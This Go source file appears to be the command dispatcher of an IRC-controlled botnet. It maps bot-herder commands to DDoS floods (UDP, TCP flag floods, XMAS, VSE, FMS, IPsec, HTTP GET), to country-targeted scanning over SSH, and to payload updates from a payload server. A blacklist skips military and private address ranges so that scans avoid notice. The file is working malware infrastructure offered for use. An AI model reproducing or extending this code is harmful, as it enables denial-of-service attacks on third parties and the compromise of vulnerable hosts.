package lib

import (
	"net"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

var BotReader *string

type Bot struct {
	CPU                          int
	payload, newPayload, pServer string //"pServer" = Payload server
	password, network            string
	Channel, ChanKey             string
	BotTag, BotHerder            string
	scanOpt                      string
	scanNetwork                  []string
	isRandom, scanSwitch         bool
	IRC                          net.Conn
	timeout                      time.Duration
	session                      *ssh.Client
}

type Attack struct {
	srcAddr, dstAddr, url                                string
	dstPort                                              string
	httpMethod, reqHeader                                string
	flags                                                string
	attackReport                                         string
	reportSwitch, attackSwitch                           bool
	ddosPayload                                          []byte
	synFlag, ackFlag, rstFlag, pshFlag, finFlag, urgFlag bool
}

type Caller struct {
	CallAttack *Attack
	CallBot    *Bot
	CallFunc   func()
}

var ScanMap = map[string]Bot{
	"-cn": {
		scanNetwork: ChinaNetwork,
		isRandom:    false,
	},
	"-usa": {
		scanNetwork: AmericaNetwork,
		isRandom:    false,
	},
	"-kr": {
		scanNetwork: KoreaNetwork,
		isRandom:    false,
	},
	"-br": {
		scanNetwork: BrazilNetwork,
		isRandom:    false,
	},
	"-r": {
		scanNetwork: RandomNetwork,
		isRandom:    true,
	},
}

var TCPAttackMap = map[string]Attack{
	"-syn": {
		synFlag: true,
	},
	"-ack": {
		ackFlag: true,
	},
	"-rst": {
		rstFlag: true,
	},
	"-psh": {
		pshFlag: true,
	},
	"-fin": {
		finFlag: true,
	},
	"-urg": {
		urgFlag: true,
	},
}

/*
	Blacklist IP that will be skip in random scanning process. Skip since first network ID.
	I don't recommend you to write map like this in Go, i do this because you know...
	In my opinion it's look cleaner than using if statement with "or" operator for these bunch of Blacklist IP.
*/
var BlacklistIP = map[string]struct{}{
	/*
		Loopback
	*/
	"127.": {},

	/*
		General Electric Company
	*/
	"3.": {},

	/*
		Hewlett-Packard Company
	*/
	"15.": {}, "16.": {},

	/*
		US Postal Service
	*/
	"56.": {},

	/*
		Internal network
	*/
	"10.": {}, "192.": {}, "172.": {},

	/*
		NAT
	*/
	"100.": {}, "169.": {},

	/*
		Special use
	*/
	"198.": {},

	/*
		Multicast
	*/
	"224.": {},

	/*
		Department of Defense
	*/
	"6.": {}, "7.": {}, "11.": {}, "21.": {}, "22.": {}, "26.": {}, "28.": {},
	"29.": {}, "30.": {}, "33.": {}, "55.": {}, "214.": {}, "215.": {},
}

func (b *Bot) AccessPerms() bool {
	return Find(Recv(*BotReader, 0), b.BotHerder)
}

func ComdSetup(args int, cut string) string {
	return strings.Trim(Recv(*BotReader, args), cut)
}

func SetupCaller(input string) (Caller, bool) {
	if input == "?tcp" {
		var CALL_5_ARG = map[string]Caller{
			"?tcp": {
				CallAttack: &Attack{
					flags:        Recv(*BotReader, 4),
					srcAddr:      Recv(*BotReader, 5),
					dstAddr:      Recv(*BotReader, 6),
					dstPort:      Recv(*BotReader, 7),
					ddosPayload:  sockBuffer(Recv(*BotReader, 8)),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
		}
		value, key := CALL_5_ARG[input]
		return value, key
	} else if input == "?udp" || input == "?saf" || input == "?paf" || input == "?xmas" {
		var CALL_4_ARG = map[string]Caller{
			"?udp": {
				CallAttack: &Attack{
					srcAddr:      Recv(*BotReader, 4),
					dstAddr:      Recv(*BotReader, 5),
					dstPort:      Recv(*BotReader, 6),
					ddosPayload:  sockBuffer(Recv(*BotReader, 7)),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
			"?saf": {
				CallAttack: &Attack{
					srcAddr:      Recv(*BotReader, 4),
					dstAddr:      Recv(*BotReader, 5),
					dstPort:      Recv(*BotReader, 6),
					ddosPayload:  sockBuffer(Recv(*BotReader, 7)),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
			"?paf": {
				CallAttack: &Attack{
					srcAddr:      Recv(*BotReader, 4),
					dstAddr:      Recv(*BotReader, 5),
					dstPort:      Recv(*BotReader, 6),
					ddosPayload:  sockBuffer(Recv(*BotReader, 7)),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
			"?xmas": {
				CallAttack: &Attack{
					srcAddr:      Recv(*BotReader, 4),
					dstAddr:      Recv(*BotReader, 5),
					dstPort:      Recv(*BotReader, 6),
					ddosPayload:  sockBuffer(Recv(*BotReader, 7)),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
		}
		value, key := CALL_4_ARG[input]
		return value, key
	} else if input == "?vse" || input == "?fms" || input == "?ipsec" || input == "?scan" || input == "?update" {
		var CALL_2_ARG = map[string]Caller{
			"?vse": {
				CallAttack: &Attack{
					srcAddr:      Recv(*BotReader, 4),
					dstAddr:      Recv(*BotReader, 5),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
			"?fms": {
				CallAttack: &Attack{
					srcAddr:      Recv(*BotReader, 4),
					dstAddr:      Recv(*BotReader, 5),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
			"?ipsec": {
				CallAttack: &Attack{
					srcAddr:      Recv(*BotReader, 4),
					dstAddr:      Recv(*BotReader, 5),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
			"?scan": {
				CallBot: &Bot{
					scanOpt:    Recv(*BotReader, 4),
					pServer:    Recv(*BotReader, 5),
					scanSwitch: false,
				},
			},
			"?update": {
				CallBot: &Bot{
					newPayload: Recv(*BotReader, 4),
					pServer:    Recv(*BotReader, 5),
				},
			},
		}
		value, key := CALL_2_ARG[input]
		return value, key
	} else if input == "?get" || input == "?poling" {
		var CALL_1_ARG = map[string]Caller{
			"?get": {
				CallAttack: &Attack{
					url:          Recv(*BotReader, 4),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
			"?poling": {
				CallAttack: &Attack{
					url:          Recv(*BotReader, 4),
					attackSwitch: false,
					reportSwitch: false,
				},
			},
		}
		value, key := CALL_1_ARG[input]
		return value, key
	} else if input == "?info" || input == "?kill" || input == "?stopddos" || input == "?stopscan" {
		var CALL_NON_ARG = map[string]Caller{
			"?info": {
				CallBot: &Bot{},
			},
			"?kill": {
				CallFunc: Kill,
			},
			"?stopddos": {
				CallAttack: &Attack{
					attackSwitch: true,
					reportSwitch: true,
				},
			},
			"?stopscan": {
				CallBot: &Bot{
					scanSwitch: true,
				},
			},
		}
		value, key := CALL_NON_ARG[input]
		return value, key
	}
	return Caller{}, false
}

func (b *Bot) ExecuteCaller(input string) (func(), bool) {
	var executesCallMap = map[string]func(){
		"?udp":      b.UDP,
		"?tcp":      b.TCP,
		"?saf":      b.SAF,
		"?paf":      b.PAF,
		"?xmas":     b.XMAS,
		"?vse":      b.VSE,
		"?fms":      b.FMS,
		"?ipsec":    b.IPSEC,
		"?get":      b.GET,
		"?poling":   b.POLING,
		"?scan":     b.Scanner,
		"?update":   b.Update,
		"?info":     b.Information,
		"?kill":     Kill,
		"?stopddos": setAttackSwitch,
		"?stopscan": setScanSwitch,
	}
	value, key := executesCallMap[input]
	return value, key
}

func FunctionCaller(launch func()) {
	go launch()
}
